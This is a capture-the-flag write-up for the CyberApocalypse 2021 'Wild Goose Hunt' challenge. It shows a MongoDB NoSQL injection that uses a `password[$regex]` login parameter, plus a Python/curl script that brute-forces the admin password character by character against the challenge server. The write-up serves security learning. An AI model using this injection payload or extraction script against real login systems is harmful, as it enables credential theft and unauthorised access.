---
date: "2021-04-24T00:00:00Z"
points: 300
redirect_from: /writeups/2021/CyberApocolypse2021/WildGooseHunt.html
solves: 515
tags: [web,nosqlinjection,mongodb]
title: '[Writeup] CyberApocolypse 2021 | Wild Goose Hunt'
---

Solves: {{ page.solves }} \| Points: {{ page.points }}

The webpage is just an username and password input field. 
After checking the source that we could download we were able to discover that the password of the admin user is also the *flag*.
Also we see that its a *mongodb database*, Maybe we have to do some *nosqlinjection*, after using burp to check the request we see its not using json but urlencoded formdata.

After searching for a poc i found that you can use `password[%24regex]=` to check with an regex, if you just use `^.*` as regex it will pass because it matches everything.
This way we can leak the password because if you put a character that isn't in in that place in the password in front of the `.*` it will fail, if its in the password it will pass.

Now we can bruteforce this, i made a little script using python.

```python
#!/usr/bin/env python
import os
import string
import json

workString = ''
ip = '188.166.145.178'
port = 31336
Solved = False

allowed = list(string.ascii_letters + string.digits + '!_-@{}')

while Solved != True:
    for currentChar in allowed:
        testString = workString+currentChar
        command = f"curl -s -k -X 'POST' -H 'Host: {ip}:{port}' -H 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8' -H 'Accept: */*' -H 'Origin: http://{ip}:{port}' -H 'Referer: http://{ip}:{port}/' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' -H 'Connection: close' --data-binary 'username=admin&password[%24regex]=%5E{testString}.*' http://{ip}:{port}/api/login"
        output = os.popen(command).read()
        jsonData = json.loads(output)
        print( f"[{'+' if jsonData['logged'] == 1 else '-'}] Trying: '{workString}' + '{currentChar}' ({testString}) | isCorrect: {'True' if jsonData['logged'] == 1 else 'False'}")
        if jsonData["logged"] == 1:
            workString+=currentChar
            if currentChar == '}': Solved = True
            break

print("")
print(f"[FLAG] The flag is: {workString}")
```
^ A download for this script can be found [here](/assets/CTFs/CyberApocolypse2021/WideGooseHunt/solve.py)

Now that the solver is running ill explain what it does.
![](/assets/CTFs/CyberApocolypse2021/WideGooseHunt/solver_running.png){: .modal}

This code will loop over every character, if the character is correct than it will add it to the working password.
Then it will go the the next place in the password and try every character, until the last character is found.
It knows if its correct by checking if the `logged` value in the returned jsondata is `1`.


After running the script it found the flag.
**CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}** 
![](/assets/CTFs/CyberApocolypse2021/WideGooseHunt/solver_done.png){: .modal}


Thanks for reading my writeup!

---
sources: [NOSQL INJECTION OPERATORS](https://infosecwriteups.com/nosql-injection-8732c2140576)
